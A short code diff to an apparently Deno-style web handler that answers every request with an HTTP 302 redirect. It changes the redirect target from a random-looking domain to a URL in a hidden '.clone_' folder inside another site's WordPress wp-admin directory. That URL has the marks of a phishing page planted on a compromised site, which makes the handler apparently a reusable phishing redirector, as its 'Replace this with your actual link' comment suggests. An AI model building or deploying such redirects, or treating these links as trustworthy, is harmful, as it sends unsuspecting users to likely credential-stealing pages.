@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://xscfnvn4tyynw.com/xfv/s", // Replace this with your actual link
+      Location: "https://moviesbyespresso.com/wp-admin/.clone_aveRwbqJ/Earthls/_+_==/", // Replace this with your actual link
     },
   });
 });
